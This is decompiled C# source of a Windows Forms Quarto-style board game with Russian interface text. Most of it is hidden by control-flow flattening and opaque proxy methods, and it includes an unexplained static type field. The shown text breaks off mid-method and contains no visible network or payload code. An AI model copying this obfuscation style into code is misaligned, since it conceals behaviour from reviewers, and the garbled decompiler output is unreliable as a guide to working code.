using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -1845137094;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x8CDEC273u) % 5u)
					{
					case 2u:
						Dark = copy.Dark;
						num = (int)((num2 * 318403854) ^ 0x7E47FBE0);
						continue;
					case 1u:
						num = (int)((num2 * 2024364302) ^ 0x533A2D53);
						continue;
					case 0u:
						Big = copy.Big;
						num = (int)(num2 * 28707615) ^ -356320757;
						continue;
					case 3u:
						break;
					default:
						Square = copy.Square;
						Point = copy.Point;
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -1514456571;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE79A0EABu) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000d:
				num = (int)((num2 * 124089623) ^ 0x2A80DDBE);
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 464286879;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5EB4072Bu) % 7u)
				{
				case 5u:
					num = (int)(num2 * 1747034058) ^ -358401324;
					continue;
				case 4u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = 297870430;
						num3 = 297870430;
					}
					else
					{
						num = 18736624;
						num3 = 18736624;
					}
					continue;
				}
				case 3u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 1604307234) ^ -2015277837;
					continue;
				case 2u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 557645524;
					continue;
				}
				case 1u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1074126990) ^ 0x6934CCCA;
					continue;
				default:
					return;
				case 6u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1824144198;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x69532809u) % 24u)
				{
				case 23u:
					num = (int)(num2 * 67419007) ^ -1077990611;
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = (int)(num2 * 668784532) ^ -1177791343;
					continue;
				case 21u:
					Paint_Board();
					num = (int)((num2 * 629753649) ^ 0x3893A4B2);
					continue;
				case 20u:
					num3++;
					num = ((int)num2 * -104871306) ^ -449565366;
					continue;
				case 19u:
				{
					int num7;
					if (num4 >= 4)
					{
						num = 240014924;
						num7 = 240014924;
					}
					else
					{
						num = 1027851771;
						num7 = 1027851771;
					}
					continue;
				}
				case 18u:
					num3 = 0;
					num = 319960610;
					continue;
				case 17u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = 300861648;
					continue;
				case 16u:
					num = (int)((num2 * 313314605) ^ 0x7DE6F17D);
					continue;
				case 15u:
					storage = new Figurine[4, 4];
					num4 = 0;
					num = (int)(num2 * 1734811224) ^ -1240751636;
					continue;
				case 14u:
					num = ((int)num2 * -1649592936) ^ 0x249E9A8B;
					continue;
				case 13u:
					num = ((int)num2 * -147565548) ^ -451903346;
					continue;
				case 12u:
					num = ((int)num2 * -1781897976) ^ 0x3F91E2D1;
					continue;
				case 11u:
					num = (int)(num2 * 1624523280) ^ -709387374;
					continue;
				case 10u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -1467961566;
						num6 = -1467961566;
					}
					else
					{
						num5 = -1577174225;
						num6 = -1577174225;
					}
					num = num5 ^ (int)(num2 * 747215249);
					continue;
				}
				case 9u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = (int)((num2 * 624355070) ^ 0x17049089);
					continue;
				case 8u:
					Paint_Storage();
					num = ((int)num2 * -1452986807) ^ -1511432018;
					continue;
				case 6u:
					num = ((int)num2 * -640903955) ^ -1143812658;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -253887815) ^ -1537530654;
					continue;
				case 4u:
					num4++;
					num = (int)(num2 * 189311360) ^ -2098233718;
					continue;
				case 3u:
					flag = num3 < 4;
					num = 1982234995;
					continue;
				case 1u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -498183463) ^ 0x7C37483C;
					continue;
				case 0u:
					num = ((int)num2 * -1901346604) ^ -1528793407;
					continue;
				default:
					return;
				case 7u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num7 = default(float);
		float num6 = default(float);
		bool flag2 = default(bool);
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		int num4 = default(int);
		float num9 = default(float);
		float num5 = default(float);
		float num8 = default(float);
		bool flag3 = default(bool);
		bool point = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1096172736;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9F6296A5u) % 38u)
				{
				case 37u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1467136310) ^ 0x65BE90A3;
					continue;
				case 36u:
					num7 = (float)size * (num6 / 2f);
					num = ((int)num2 * -1185125633) ^ 0x77949054;
					continue;
				case 35u:
					flag2 = num3 < 4;
					num = -891814787;
					continue;
				case 34u:
					num = (int)(num2 * 570179842) ^ -490815670;
					continue;
				case 33u:
					Form1.smethod_28(graphics_, brush_, num7 + (float)(num4 * size), num7 + (float)(num3 * size), num9, num9);
					num = ((int)num2 * -184484738) ^ -1636332285;
					continue;
				case 32u:
					num3++;
					num = ((int)num2 * -1096727419) ^ -608535686;
					continue;
				case 31u:
					num5 = 1f;
					num = (int)(num2 * 1486947432) ^ -1024737939;
					continue;
				case 30u:
					brush_ = Form1.smethod_26();
					num = -1057149129;
					continue;
				case 29u:
					num5 = 0.7f;
					num = -1056196049;
					continue;
				case 28u:
					num = ((int)num2 * -1707250107) ^ -1704550401;
					continue;
				case 27u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7 + (float)(num4 * size), num7 + (float)(num3 * size), num9, num9);
					num = ((int)num2 * -1810116079) ^ 0x38548993;
					continue;
				case 26u:
					num6 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num8 = (float)size * num5;
					num = -887660605;
					continue;
				case 25u:
					flag3 = num4 < 4;
					num = -1900727539;
					continue;
				case 24u:
					num = ((int)num2 * -840172389) ^ 0x266E2D08;
					continue;
				case 23u:
					num = (int)(num2 * 419146840) ^ -255593117;
					continue;
				case 22u:
				{
					int num12;
					if (board[num3, num4].Big)
					{
						num = -1637683886;
						num12 = -1637683886;
					}
					else
					{
						num = -1208610480;
						num12 = -1208610480;
					}
					continue;
				}
				case 21u:
				{
					int num21;
					int num22;
					if (board[num3, num4].Dark)
					{
						num21 = -680390013;
						num22 = -680390013;
					}
					else
					{
						num21 = -153495214;
						num22 = -153495214;
					}
					num = num21 ^ ((int)num2 * -104366673);
					continue;
				}
				case 20u:
					num = ((int)num2 * -214313281) ^ -71275912;
					continue;
				case 19u:
					num4++;
					num = -1010891100;
					continue;
				case 18u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -544252737;
					continue;
				case 17u:
					num9 = num8 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num3, num4].Point;
					num = ((int)num2 * -1459243894) ^ 0x14384BF1;
					continue;
				case 16u:
				{
					int num19;
					int num20;
					if (!flag3)
					{
						num19 = -1276040819;
						num20 = -1276040819;
					}
					else
					{
						num19 = -1509546047;
						num20 = -1509546047;
					}
					num = num19 ^ (int)(num2 * 233853327);
					continue;
				}
				case 15u:
					num = (int)((num2 * 1914742169) ^ 0x723B04DB);
					continue;
				case 13u:
				{
					int num17;
					int num18;
					if (flag)
					{
						num17 = 1695446345;
						num18 = 1695446345;
					}
					else
					{
						num17 = 2017985453;
						num18 = 2017985453;
					}
					num = num17 ^ (int)(num2 * 2094974127);
					continue;
				}
				case 12u:
					num = ((int)num2 * -1334656714) ^ -990724739;
					continue;
				case 11u:
					num4 = 0;
					num = -839266175;
					continue;
				case 10u:
				{
					int num15;
					int num16;
					if (flag2)
					{
						num15 = 1462553812;
						num16 = 1462553812;
					}
					else
					{
						num15 = 2089316592;
						num16 = 2089316592;
					}
					num = num15 ^ ((int)num2 * -1045764154);
					continue;
				}
				case 9u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 547689705) ^ 0x4353E9EE);
					continue;
				case 8u:
				{
					int num13;
					int num14;
					if (point)
					{
						num13 = -1811579256;
						num14 = -1811579256;
					}
					else
					{
						num13 = -527961289;
						num14 = -527961289;
					}
					num = num13 ^ ((int)num2 * -1728999130);
					continue;
				}
				case 7u:
					Form1.smethod_24(graphics_, brush_, num7 + (float)(num4 * size), num7 + (float)(num3 * size), num9, num9);
					num = -1623295912;
					continue;
				case 6u:
				{
					num7 = (float)size * (num6 / 2f);
					num9 = num8 * 0.9f / (float)Form1.smethod_27(2.0);
					int num10;
					int num11;
					if (!board[num3, num4].Square)
					{
						num10 = -360008416;
						num11 = -360008416;
					}
					else
					{
						num10 = -1370638626;
						num11 = -1370638626;
					}
					num = num10 ^ (int)(num2 * 175614381);
					continue;
				}
				case 5u:
					num6 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1790120901;
					continue;
				case 4u:
					num = -1494459522;
					continue;
				case 3u:
					flag = board[num3, num4] != null;
					num = ((int)num2 * -1719375420) ^ 0x5D1F5FDC;
					continue;
				case 2u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num3 = 0;
					num = (int)(num2 * 384119973) ^ -1178300987;
					continue;
				case 0u:
					num = ((int)num2 * -872661583) ^ -690281738;
					continue;
				case 14u:
					break;
				default:
					Form1.smethod_30((Control)(object)pictureBox1);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		float num3 = default(float);
		float num5 = default(float);
		float num14 = default(float);
		float num15 = default(float);
		int num6 = default(int);
		int num7 = default(int);
		bool point = default(bool);
		bool big = default(bool);
		Brush brush_ = default(Brush);
		Graphics graphics_ = default(Graphics);
		float num4 = default(float);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -29003962;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB3FFE95Eu) % 40u)
				{
				case 39u:
					num3 = (float)size * num5;
					num14 = (float)size * (num15 / 2f) - 4f;
					num = ((int)num2 * -2076884794) ^ 0x36B6FACC;
					continue;
				case 38u:
					num6++;
					num = (int)(num2 * 740094906) ^ -150051749;
					continue;
				case 37u:
					Form1.smethod_20(pictureBox[num6, num7], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num6, num7]), Form1.smethod_16((Control)(object)pictureBox[num6, num7])));
					num = ((int)num2 * -1001257093) ^ 0x5691ABE2;
					continue;
				case 36u:
				{
					int num12;
					int num13;
					if (!point)
					{
						num12 = 1661527995;
						num13 = 1661527995;
					}
					else
					{
						num12 = 43339217;
						num13 = 43339217;
					}
					num = num12 ^ ((int)num2 * -1671654600);
					continue;
				}
				case 35u:
					num = (int)(num2 * 825036024) ^ -515739870;
					continue;
				case 33u:
					num = ((int)num2 * -1529351388) ^ -1989324776;
					continue;
				case 32u:
				{
					int num18;
					int num19;
					if (!big)
					{
						num18 = -778077917;
						num19 = -778077917;
					}
					else
					{
						num18 = -827057313;
						num19 = -827057313;
					}
					num = num18 ^ (int)(num2 * 268936484);
					continue;
				}
				case 31u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1256086012) ^ 0x66B1B641);
					continue;
				case 30u:
				{
					int num10;
					if (storage[num6, num7] != null)
					{
						num = -963577695;
						num10 = -963577695;
					}
					else
					{
						num = -239053740;
						num10 = -239053740;
					}
					continue;
				}
				case 29u:
					num5 = 0.7f;
					num = -19007076;
					continue;
				case 28u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num6, num7]));
					int num20;
					int num21;
					if (storage[num6, num7].Dark)
					{
						num20 = -1902195451;
						num21 = -1902195451;
					}
					else
					{
						num20 = -1698771810;
						num21 = -1698771810;
					}
					num = num20 ^ ((int)num2 * -1811519573);
					continue;
				}
				case 27u:
					num14 = (float)size * (num15 / 2f) - 4f;
					num4 = num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1430459207) ^ -431147363;
					continue;
				case 26u:
					num15 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -878927359;
					continue;
				case 25u:
					Form1.smethod_28(graphics_, brush_, num14, num14, num4, num4);
					num = (int)(num2 * 850401734) ^ -1814582109;
					continue;
				case 23u:
					num = ((int)num2 * -181603531) ^ -1062320072;
					continue;
				case 22u:
					Form1.smethod_24(graphics_, brush_, num14, num14, num4, num4);
					num = -12183433;
					continue;
				case 21u:
				{
					int num16;
					int num17;
					if (!flag2)
					{
						num16 = 935283933;
						num17 = 935283933;
					}
					else
					{
						num16 = 143870203;
						num17 = 143870203;
					}
					num = num16 ^ ((int)num2 * -868365105);
					continue;
				}
				case 20u:
					flag = num7 < 2;
					num = (int)((num2 * 1354826557) ^ 0x21FAEE76);
					continue;
				case 19u:
					num = ((int)num2 * -1418217774) ^ 0x7A4478C2;
					continue;
				case 18u:
					num7++;
					num = -1946364173;
					continue;
				case 17u:
					flag2 = num6 < 4;
					num = -378420805;
					continue;
				case 16u:
					num6 = 0;
					num = ((int)num2 * -1586888954) ^ 0x5AD152B8;
					continue;
				case 15u:
					num = ((int)num2 * -654553147) ^ 0x223F0DF0;
					continue;
				case 14u:
					num = ((int)num2 * -1236422756) ^ -1433054129;
					continue;
				case 13u:
					Form1.smethod_30((Control)(object)pictureBox[num6, num7]);
					num = -122259833;
					continue;
				case 12u:
					brush_ = Form1.smethod_26();
					num = -1525599204;
					continue;
				case 11u:
					num = (int)((num2 * 1304326225) ^ 0x64DD8077);
					continue;
				case 10u:
					num15 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -183930259;
					continue;
				case 9u:
					num = (int)((num2 * 290344786) ^ 0x5EBCF24F);
					continue;
				case 8u:
					point = storage[num6, num7].Point;
					num = ((int)num2 * -660414502) ^ -835508582;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num14, num14, num4, num4);
					num = (int)((num2 * 2132763715) ^ 0x2814AC64);
					continue;
				case 6u:
					num7 = 0;
					num = -1946364173;
					continue;
				case 5u:
				{
					int num11;
					if (num7 < 4)
					{
						num = -305351272;
						num11 = -305351272;
					}
					else
					{
						num = -1971233976;
						num11 = -1971233976;
					}
					continue;
				}
				case 4u:
				{
					int num8;
					int num9;
					if (flag)
					{
						num8 = 1076648103;
						num9 = 1076648103;
					}
					else
					{
						num8 = 1989917320;
						num9 = 1989917320;
					}
					num = num8 ^ ((int)num2 * -1081322478);
					continue;
				}
				case 3u:
					num = (int)((num2 * 2120386869) ^ 0x2D62D3EB);
					continue;
				case 2u:
					big = storage[num6, num7].Big;
					num = -879913090;
					continue;
				case 1u:
					num5 = 1f;
					num = ((int)num2 * -1765015446) ^ -141051658;
					continue;
				case 0u:
					num4 = num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -426899588) ^ 0x63EBC97A;
					continue;
				default:
					return;
				case 34u:
					break;
				case 24u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num9 = default(int);
		int num3 = default(int);
		int num11 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		while (true)
		{
			int num = -1482712056;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xACE8366Bu) % 29u)
				{
				case 28u:
					Form1.smethod_7((Control)(object)pictureBox[num9, num3], bool_0: true);
					num = -788533597;
					continue;
				case 27u:
					num9 = 0;
					num = (int)(num2 * 1736030794) ^ -1996420721;
					continue;
				case 26u:
					num11 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -236327094) ^ -1532476477;
					continue;
				case 25u:
				{
					int num7;
					int num8;
					if (turn)
					{
						num7 = -1311059087;
						num8 = -1311059087;
					}
					else
					{
						num7 = -1049869875;
						num8 = -1049869875;
					}
					num = num7 ^ (int)(num2 * 1818994897);
					continue;
				}
				case 24u:
					num9++;
					num = ((int)num2 * -1340599781) ^ -2091291926;
					continue;
				case 23u:
					num = (int)(num2 * 1207244234) ^ -934132183;
					continue;
				case 22u:
					num = (int)((num2 * 758699528) ^ 0x49CFF547);
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = ((int)num2 * -378050887) ^ -244258680;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -677603571;
					continue;
				case 19u:
					flag = num9 < 4;
					num = -1387630478;
					continue;
				case 17u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -886717801) ^ -1112126118;
					continue;
				case 16u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 52972650) ^ 0x73D563F4);
					continue;
				case 15u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -1605751310) ^ 0x1CDF4513;
					continue;
				case 14u:
					step = 1;
					num = ((int)num2 * -521537332) ^ -1933020195;
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num4, num11], Color.Blue);
					num = (int)(num2 * 843637526) ^ -989461803;
					continue;
				case 12u:
					num = (int)(num2 * 1203917193) ^ -75230879;
					continue;
				case 11u:
					num = -917915841;
					continue;
				case 10u:
				{
					int num10;
					if (num3 >= 4)
					{
						num = -2114000868;
						num10 = -2114000868;
					}
					else
					{
						num = -1245288817;
						num10 = -1245288817;
					}
					continue;
				}
				case 9u:
					num = ((int)num2 * -23236250) ^ -1183404548;
					continue;
				case 8u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -1118116062) ^ -2009761289;
					continue;
				case 6u:
					num3 = 0;
					num = -553232830;
					continue;
				case 5u:
					num = (int)(num2 * 553178400) ^ -249708064;
					continue;
				case 4u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -2140799964;
						num6 = -2140799964;
					}
					else
					{
						num5 = -1537316945;
						num6 = -1537316945;
					}
					num = num5 ^ (int)(num2 * 2131453451);
					continue;
				}
				case 3u:
					num4 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1490045735) ^ 0x2A2B435);
					continue;
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -1535081112) ^ -2056455035;
					continue;
				case 1u:
					num = ((int)num2 * -1534974672) ^ -917908225;
					continue;
				case 0u:
					num3++;
					num = ((int)num2 * -354251787) ^ 0x3911592A;
					continue;
				default:
					return;
				case 7u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		int num9 = default(int);
		Point point = default(Point);
		bool flag3 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		int num12 = default(int);
		int num7 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -645113243;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0x86D6245Cu) % 27u)
				{
				case 26u:
					num = (int)(num2 * 1261681291) ^ -835406288;
					continue;
				case 25u:
					num9 = point.X / size;
					flag3 = num9 > 1;
					num = (int)(num2 * 1747837347) ^ -824346114;
					continue;
				case 24u:
					num = ((int)num2 * -1208388997) ^ 0x6D6F6B38;
					continue;
				case 23u:
					if (storage[num3, num9] != null)
					{
						num = -679947971;
						continue;
					}
					num6 = 0;
					goto IL_006d;
				case 22u:
					flag = num12 < 4;
					num = -1353442492;
					continue;
				case 21u:
					num = (int)(num2 * 634813492) ^ -1344470452;
					continue;
				case 20u:
					Form1.smethod_5((Control)(object)borderBox[num3, num9], Color.Red);
					num = ((int)num2 * -1857805080) ^ -920688925;
					continue;
				case 19u:
				{
					int num8;
					if (num7 < 4)
					{
						num = -339544541;
						num8 = -339544541;
					}
					else
					{
						num = -1142900672;
						num8 = -1142900672;
					}
					continue;
				}
				case 18u:
					num6 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num9]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_006d;
				case 17u:
					Form1.smethod_5((Control)(object)borderBox[num7, num12], Color.White);
					num = -1701200366;
					continue;
				case 16u:
					num = ((int)num2 * -133090431) ^ 0x64F803D9;
					continue;
				case 15u:
					num7++;
					num = (int)((num2 * 1022142637) ^ 0x1789B7D7);
					continue;
				case 14u:
				{
					int num13;
					int num14;
					if (!flag3)
					{
						num13 = 436838059;
						num14 = 436838059;
					}
					else
					{
						num13 = 2116216621;
						num14 = 2116216621;
					}
					num = num13 ^ ((int)num2 * -1362095279);
					continue;
				}
				case 13u:
					num12++;
					num = (int)(num2 * 1861608304) ^ -2056275336;
					continue;
				case 12u:
					num7 = 0;
					num = ((int)num2 * -202347769) ^ -694020101;
					continue;
				case 10u:
					num12 = 0;
					num = -1417414203;
					continue;
				case 9u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 70337648;
						num11 = 70337648;
					}
					else
					{
						num10 = 8915859;
						num11 = 8915859;
					}
					num = num10 ^ (int)(num2 * 193056998);
					continue;
				}
				case 8u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 1387346494) ^ -751465932;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 130951027) ^ -207419305;
					continue;
				case 6u:
					num9 -= 4;
					num = (int)(num2 * 1994344384) ^ -602677380;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -51547616) ^ -2039603462;
					continue;
				case 4u:
					num = (int)((num2 * 734086115) ^ 0x4DFDEAC6);
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -860575740;
						num5 = -860575740;
					}
					else
					{
						num4 = -1325570115;
						num5 = -1325570115;
					}
					num = num4 ^ (int)(num2 * 608910082);
					continue;
				}
				case 2u:
					num = ((int)num2 * -196317814) ^ -833927207;
					continue;
				case 0u:
					num3 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)(num2 * 1849928788) ^ -145586541;
					continue;
				default:
					return;
				case 11u:
					break;
				case 1u:
					return;
					IL_006d:
					flag2 = (byte)num6 != 0;
					num = -973762996;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_02ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num2 = Form1.smethod_39(e) / size;
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		int num8 = default(int);
		Graphics graphics_ = default(Graphics);
		int num5 = default(int);
		while (true)
		{
			int num3 = -238893703;
			while (true)
			{
				uint num4;
				int num11;
				switch ((num4 = (uint)num3 ^ 0xFA0EED6Au) % 25u)
				{
				case 24u:
					if (board[num2, num] == null)
					{
						num3 = -1547738926;
						num11 = -1547738926;
						continue;
					}
					goto IL_003f;
				case 23u:
				{
					int num12;
					int num13;
					if (!flag2)
					{
						num12 = 939209148;
						num13 = 939209148;
					}
					else
					{
						num12 = 819078526;
						num13 = 819078526;
					}
					num3 = num12 ^ ((int)num4 * -1943475779);
					continue;
				}
				case 22u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = -595193719;
						num7 = -595193719;
					}
					else
					{
						num6 = -191700249;
						num7 = -191700249;
					}
					num3 = num6 ^ (int)(num4 * 501919671);
					continue;
				}
				case 21u:
				{
					int num9;
					int num10;
					if (!flag3)
					{
						num9 = 173398706;
						num10 = 173398706;
					}
					else
					{
						num9 = 1213109930;
						num10 = 1213109930;
					}
					num3 = num9 ^ ((int)num4 * -1571255366);
					continue;
				}
				case 19u:
					num3 = ((int)num4 * -1885738583) ^ 0x4C90FDE1;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num3 = ((int)num4 * -1522376401) ^ -1436108716;
					continue;
				case 17u:
					num8 = 0;
					num3 = -1415445848;
					continue;
				case 16u:
					num3 = (int)((num4 * 938599598) ^ 0x6E9C2FFC);
					continue;
				case 15u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num2 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num8]), num * size + 4, num2 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num3 = ((int)num4 * -302317556) ^ -112516624;
					continue;
				case 14u:
					flag3 = num5 < 4;
					num3 = -1193820838;
					continue;
				case 13u:
					num8++;
					num3 = -2111204832;
					continue;
				case 11u:
					Form1.smethod_45(graphics_);
					num3 = (int)((num4 * 1313149615) ^ 0x2FA3F473);
					continue;
				case 10u:
					flag2 = num8 < 4;
					num3 = -1093302597;
					continue;
				case 9u:
					num3 = (int)(num4 * 1057260161) ^ -1350314794;
					continue;
				case 8u:
					flag = Form1.smethod_41((Control)(object)borderBox[num5, num8]) == Color.Blue;
					num3 = -1695956904;
					continue;
				case 7u:
					num5++;
					num3 = (int)((num4 * 1030764344) ^ 0x337BAFCE);
					continue;
				case 6u:
					num3 = ((int)num4 * -97620826) ^ -1366137842;
					continue;
				case 5u:
					Paint_Board();
					num3 = (int)(num4 * 2064612086) ^ -1878981695;
					continue;
				case 4u:
